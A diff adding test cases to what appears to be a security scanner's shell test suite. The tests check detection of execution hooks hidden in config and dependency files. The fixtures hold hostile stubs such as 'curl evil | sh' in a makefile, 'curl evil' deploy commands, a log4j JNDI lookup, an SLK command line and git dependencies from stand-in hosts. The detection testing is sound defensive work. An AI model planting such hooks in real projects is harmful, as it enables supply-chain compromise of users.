@@ -9210,6 +9210,151 @@ printf 'BEGIN:VCARD\nPHOTO;VALUE=URI:http://evil/x\nEND:VCARD\n' \
     && check "file: vcf uri flagged" "0" "0" \
     || check "file: vcf uri flagged" "0" "1"
 
+# F56: tool-config-as-code, java container, deploy + ecosystem carriers
+mkdir -p "$XDIR/tc1" "$XDIR/tc2"
+printf '{"compilerOptions":{"plugins":[{"name":"evil"}]}}\n' \
+    > "$XDIR/tc1/tsconfig.json"
+./hlse_core file "$XDIR/tc1/tsconfig.json" 2>&1 | grep -q "F56" \
+    && check "file: tsconfig plugins flagged" "0" "0" \
+    || check "file: tsconfig plugins flagged" "0" "1"
+printf '{}\n' > "$XDIR/tc2/tsconfig.json"
+./hlse_core file "$XDIR/tc2/tsconfig.json" 2>&1 | grep -q "F56" \
+    && check "file: benign tsconfig no F56" "0" "1" \
+    || check "file: benign tsconfig no F56" "0" "0"
+printf 'module.exports={plugins:[require("evil")]}\n' \
+    > "$XDIR/tc1/webpack.config.js"
+./hlse_core file "$XDIR/tc1/webpack.config.js" 2>&1 | grep -q "F56" \
+    && check "file: webpack config flagged" "0" "0" \
+    || check "file: webpack config flagged" "0" "1"
+printf 'module.exports={}\n' > "$XDIR/tc2/webpack.config.js"
+./hlse_core file "$XDIR/tc2/webpack.config.js" 2>&1 | grep -q "F56" \
+    && check "file: benign webpack config no F56" "0" "1" \
+    || check "file: benign webpack config no F56" "0" "0"
+printf 'import pytest\ndef pytest_configure(): pass\n' > "$XDIR/tc1/conftest.py"
+./hlse_core file "$XDIR/tc1/conftest.py" 2>&1 | grep -q "F56" \
+    && check "file: conftest hooks flagged" "0" "0" \
+    || check "file: conftest hooks flagged" "0" "1"
+printf 'run lambda { |_| }\n' > "$XDIR/tc1/config.ru"
+./hlse_core file "$XDIR/tc1/config.ru" 2>&1 | grep -q "F56" \
+    && check "file: config.ru run flagged" "0" "0" \
+    || check "file: config.ru run flagged" "0" "1"
+printf 'box: x\nbuild:\n  steps:\n    - script: curl evil\n' > "$XDIR/tc1/wercker.yml"
+./hlse_core file "$XDIR/tc1/wercker.yml" 2>&1 | grep -q "F56" \
+    && check "file: wercker script flagged" "0" "0" \
+    || check "file: wercker script flagged" "0" "1"
+printf 'steps: []\n' > "$XDIR/tc2/wercker.yml"
+./hlse_core file "$XDIR/tc2/wercker.yml" 2>&1 | grep -q "F56" \
+    && check "file: benign wercker no F56" "0" "1" \
+    || check "file: benign wercker no F56" "0" "0"
+printf 'jobs:\n- plan:\n  - task: t\n    config:\n      run:\n        path: sh\n' \
+    > "$XDIR/tc1/pipeline.yml"
+./hlse_core file "$XDIR/tc1/pipeline.yml" 2>&1 | grep -q "F56" \
+    && check "file: concourse run flagged" "0" "0" \
+    || check "file: concourse run flagged" "0" "1"
+printf 'job "x" {\n  task "t" {\n    driver = "exec"\n    config { command = "c" }\n  }\n}\n' \
+    > "$XDIR/tc1/j.nomad"
+./hlse_core file "$XDIR/tc1/j.nomad" 2>&1 | grep -q "F56" \
+    && check "file: nomad exec flagged" "0" "0" \
+    || check "file: nomad exec flagged" "0" "1"
+printf 'build {\n  provisioner "shell" { script = "x.sh" }\n}\n' \
+    > "$XDIR/tc1/p.pkr.hcl"
+./hlse_core file "$XDIR/tc1/p.pkr.hcl" 2>&1 | grep -q "F56" \
+    && check "file: packer provisioner flagged" "0" "0" \
+    || check "file: packer provisioner flagged" "0" "1"
+printf 'service: x\nplugins:\n  - evil\n' > "$XDIR/tc1/serverless.yml"
+./hlse_core file "$XDIR/tc1/serverless.yml" 2>&1 | grep -q "F56" \
+    && check "file: serverless plugins flagged" "0" "0" \
+    || check "file: serverless plugins flagged" "0" "1"
+printf '[build]\ncommand = "curl evil"\n' > "$XDIR/tc1/netlify.toml"
+./hlse_core file "$XDIR/tc1/netlify.toml" 2>&1 | grep -q "F56" \
+    && check "file: netlify command flagged" "0" "0" \
+    || check "file: netlify command flagged" "0" "1"
+printf '{"rewrites":[{"source":"/a","destination":"http://evil"}]}\n' \
+    > "$XDIR/tc1/vercel.json"
+./hlse_core file "$XDIR/tc1/vercel.json" 2>&1 | grep -q "F56" \
+    && check "file: vercel rewrites flagged" "0" "0" \
+    || check "file: vercel rewrites flagged" "0" "1"
+printf '[deploy]\nrelease_command = "curl evil"\n' > "$XDIR/tc1/fly.toml"
+./hlse_core file "$XDIR/tc1/fly.toml" 2>&1 | grep -q "F56" \
+    && check "file: fly release_command flagged" "0" "0" \
+    || check "file: fly release_command flagged" "0" "1"
+printf 'runtime: python\nentrypoint: evil\n' > "$XDIR/tc1/app.yaml"
+./hlse_core file "$XDIR/tc1/app.yaml" 2>&1 | grep -q "F56" \
+    && check "file: gae entrypoint flagged" "0" "0" \
+    || check "file: gae entrypoint flagged" "0" "1"
+printf '<Server><Listener className="evil"/></Server>\n' \
+    > "$XDIR/tc1/server.xml"
+./hlse_core file "$XDIR/tc1/server.xml" 2>&1 | grep -q "F56" \
+    && check "file: tomcat listener flagged" "0" "0" \
+    || check "file: tomcat listener flagged" "0" "1"
+printf '<beans><bean class="evil" init-method="x"/></beans>\n' \
+    > "$XDIR/tc1/applicationContext.xml"
+./hlse_core file "$XDIR/tc1/applicationContext.xml" 2>&1 | grep -q "F56" \
+    && check "file: spring bean flagged" "0" "0" \
+    || check "file: spring bean flagged" "0" "1"
+printf '<beans></beans>\n' > "$XDIR/tc2/applicationContext.xml"
+./hlse_core file "$XDIR/tc2/applicationContext.xml" 2>&1 | grep -q "F56" \
+    && check "file: benign beans no F56" "0" "1" \
+    || check "file: benign beans no F56" "0" "0"
+printf '<configuration><appender class="x"><param value="${jndi:ldap://e}"/></appender></configuration>\n' \
+    > "$XDIR/tc1/log4j2.xml"
+./hlse_core file "$XDIR/tc1/log4j2.xml" 2>&1 | grep -q "F56" \
+    && check "file: log4j jndi flagged" "0" "0" \
+    || check "file: log4j jndi flagged" "0" "1"
+printf 'Manifest-Version: 1.0\nPremain-Class: evil.Agent\n' \
+    > "$XDIR/tc1/MANIFEST.MF"
+./hlse_core file "$XDIR/tc1/MANIFEST.MF" 2>&1 | grep -q "F56" \
+    && check "file: manifest premain flagged" "0" "0" \
+    || check "file: manifest premain flagged" "0" "1"
+printf 'ID;P\nE;Cmd=|/c calc\n' > "$XDIR/tc1/x.slk"
+./hlse_core file "$XDIR/tc1/x.slk" 2>&1 | grep -q "F56" \
+    && check "file: slk cmd flagged" "0" "0" \
+    || check "file: slk cmd flagged" "0" "1"
+printf 'name: x\ndependencies:\n  evil:\n    git: http://e\n' \
+    > "$XDIR/tc1/pubspec.yaml"
+./hlse_core file "$XDIR/tc1/pubspec.yaml" 2>&1 | grep -q "F56" \
+    && check "file: pubspec git dep flagged" "0" "0" \
+    || check "file: pubspec git dep flagged" "0" "1"
+printf 'name: x\ndependencies: {}\n' > "$XDIR/tc2/pubspec.yaml"
+./hlse_core file "$XDIR/tc2/pubspec.yaml" 2>&1 | grep -q "F56" \
+    && check "file: benign pubspec no F56" "0" "1" \
+    || check "file: benign pubspec no F56" "0" "0"
+printf '{:deps {evil {:git/url "http://e" :sha "x"}}}\n' > "$XDIR/tc1/deps.edn"
+./hlse_core file "$XDIR/tc1/deps.edn" 2>&1 | grep -q "F56" \
+    && check "file: deps.edn git url flagged" "0" "0" \
+    || check "file: deps.edn git url flagged" "0" "1"
+printf 'def deps do\n  [{:evil, git: "http://e"}]\nend\n' > "$XDIR/tc1/mix.exs"
+./hlse_core file "$XDIR/tc1/mix.exs" 2>&1 | grep -q "F56" \
+    && check "file: mix.exs git dep flagged" "0" "0" \
+    || check "file: mix.exs git dep flagged" "0" "1"
+printf 'name: x\ndependencies:\n  evil:\n    github: e/e\n' > "$XDIR/tc1/shard.yml"
+./hlse_core file "$XDIR/tc1/shard.yml" 2>&1 | grep -q "F56" \
+    && check "file: shard github dep flagged" "0" "0" \
+    || check "file: shard github dep flagged" "0" "1"
+printf '{"scripts":{"x":"curl e"},"repositories":[{"url":"http://e"}]}\n' \
+    > "$XDIR/tc1/composer.json"
+./hlse_core file "$XDIR/tc1/composer.json" 2>&1 | grep -q "F56" \
+    && check "file: composer scripts flagged" "0" "0" \
+    || check "file: composer scripts flagged" "0" "1"
+printf 'packages: .\nsource-repository-package\n  type: git\n' \
+    > "$XDIR/tc1/cabal.project"
+./hlse_core file "$XDIR/tc1/cabal.project" 2>&1 | grep -q "F56" \
+    && check "file: cabal source-repo flagged" "0" "0" \
+    || check "file: cabal source-repo flagged" "0" "1"
+printf '{\n  "folders": [],\n  "settings": {"go.alternateTools": {"gopls": "/tmp/e"}}\n}\n' \
+    > "$XDIR/tc1/x.code-workspace"
+./hlse_core file "$XDIR/tc1/x.code-workspace" 2>&1 | grep -q "F56" \
+    && check "file: code-workspace tools flagged" "0" "0" \
+    || check "file: code-workspace tools flagged" "0" "1"
+printf 'all:\n\t@curl evil | sh\n' > "$XDIR/tc1/makefile"
+./hlse_core file "$XDIR/tc1/makefile" 2>&1 | grep -q "F56" \
+    && check "file: makefile curl flagged" "0" "0" \
+    || check "file: makefile curl flagged" "0" "1"
+printf 'all:\n\t@cc -o x x.c\n' > "$XDIR/tc2/makefile"
+./hlse_core file "$XDIR/tc2/makefile" 2>&1 | grep -q "F56" \
+    && check "file: benign makefile no F56" "0" "1" \
+    || check "file: benign makefile no F56" "0" "0"
+
 # F56: desktop/build/IDE + AI-instruction carriers
 mkdir -p "$XDIR/ld1" "$XDIR/ld2"
 printf '[Desktop Entry]\nName=x\nExec=/tmp/evil\nType=Application\n' \
